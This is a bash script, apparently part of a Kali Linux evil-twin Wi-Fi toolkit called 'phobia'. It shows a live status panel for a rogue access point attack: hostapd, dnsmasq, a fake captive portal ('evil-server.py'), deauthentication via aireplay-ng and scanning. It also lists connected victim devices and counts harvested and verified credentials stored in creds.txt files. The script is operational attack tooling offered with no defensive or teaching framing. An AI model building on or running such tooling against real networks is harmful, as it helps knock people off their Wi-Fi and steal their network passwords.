#!/bin/bash
# live attack summary — what's running, what's connected, stop instructions
PHOBIA="/home/kali/phobia"
while true; do
    clear
    echo -e "\033[1;36m═══════ ATTACK STATUS ═══════\033[0m"
    echo ""

    # service state
    alive() {
        pgrep -f "$1" >/dev/null 2>&1 && echo -e "\033[1;32mRUN \033[0m" || echo -e "\033[1;31mSTOP\033[0m"
    }
    printf "  hostapd      %s\n" "$(alive hostapd)"
    printf "  dnsmasq      %s\n" "$(alive dnsmasq)"
    printf "  portal(py)   %s\n" "$(alive evil-server.py)"
    printf "  deauth       %s\n" "$(alive aireplay-ng)"
    printf "  scan         %s\n" "$(alive airodump-ng)"

    echo ""
    echo -e "\033[1;36m═══════ INTERNET ═══════\033[0m"
    fwd=$(cat /proc/sys/net/ipv4/ip_forward 2>/dev/null)
    if [ "$fwd" = "1" ]; then
        echo -e "  \033[1;32mENABLED\033[0m  via eth0 NAT"
    else
        echo -e "  \033[1;31mOFF   \033[0m  isolated portal"
    fi

    echo ""
    echo -e "\033[1;36m═══════ DEVICES ═══════\033[0m"
    if [ -f /var/lib/misc/dnsmasq.leases ]; then
        n=$(wc -l < /var/lib/misc/dnsmasq.leases 2>/dev/null)
        echo "  connected: ${n:-0}"
        while read -r _ mac ip host _; do
            printf "  \033[1;33m%s\033[0m  \033[1;32m%s\033[0m  %s\n" "$mac" "$ip" "${host:-?}"
        done < /var/lib/misc/dnsmasq.leases 2>/dev/null | head -5
    else
        echo "  connected: 0"
    fi

    echo ""
    echo -e "\033[1;36m═══════ CREDS ═══════\033[0m"
    if [ -f /var/www/html/creds.txt ]; then
        n=$(wc -l < /var/www/html/creds.txt 2>/dev/null)
        echo "  submissions: ${n:-0}"
    fi
    if [ -f /var/www/html/verified_creds.txt ]; then
        v=$(wc -l < /var/www/html/verified_creds.txt 2>/dev/null)
        [ -n "$v" ] && [ "$v" -gt 0 ] && echo -e "  \033[1;32mverified: $v\033[0m"
    fi

    echo ""
    echo -e "\033[1;36m═════════════════════════════\033[0m"
    echo -e "\033[1;31m  Press Ctrl+C in the MAIN"
    echo -e "  terminal to STOP all attacks\033[0m"
    echo -e "\033[1;36m═════════════════════════════\033[0m"

    sleep 2
done
